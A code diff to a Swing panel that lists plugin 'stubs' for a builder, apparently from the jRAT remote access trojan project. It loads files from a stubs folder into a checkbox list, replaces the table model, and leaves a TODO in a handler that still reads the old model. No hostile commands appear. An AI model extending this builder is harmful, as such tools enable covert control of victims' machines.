@@ -18,6 +18,7 @@ import javax.swing.table.DefaultTableModel;
 
 import pro.jrat.extensions.ExternalPlugin;
 import pro.jrat.extensions.PluginList;
+import pro.jrat.ui.components.JCheckBoxList;
 import pro.jrat.ui.renderers.table.PluginsTableRenderer;
 
 
@@ -69,7 +70,7 @@ public class PanelBuildPlugins extends JPanel {
 				int row = table.getSelectedRow();
 				if (row != -1) {
 					String n = model.getValueAt(row, 1).toString();
-
+					// TODO
 					for (ExternalPlugin p : list.plugins) {
 						if (p.name.equals(n)) {
 							list.plugins.remove(p);
@@ -112,15 +113,25 @@ public class PanelBuildPlugins extends JPanel {
 					.addContainerGap(20, Short.MAX_VALUE))
 		);
 
-		table = new JTable();
+		File[] files = new File("plugins/stubs/").listFiles();
+		
+		Object[] obj = new Object[files.length];
+		
+		for (int i = 0; i < files.length; i++) {
+			obj[i] = files[i].getAbsolutePath();
+			ExternalPlugin p = new ExternalPlugin(files[i].getAbsolutePath(), false);
+			list.plugins.add(p);
+		}
+		
+		table = new JCheckBoxList(obj);
 		table.setRowHeight(25);
 		table.setDefaultRenderer(Object.class, new PluginsTableRenderer());
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Plugin Name" }) {
+		/*table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Plugin Name" }) {
 			public boolean isCellEditable(int i, int i1) {
 				return false;
 			}
-		});
-		table.getColumnModel().getColumn(0).setPreferredWidth(100);
+		});*/
+		table.getTableHeader().setReorderingAllowed(false);
 		scrollPane.setViewportView(table);
 		setLayout(groupLayout);
 
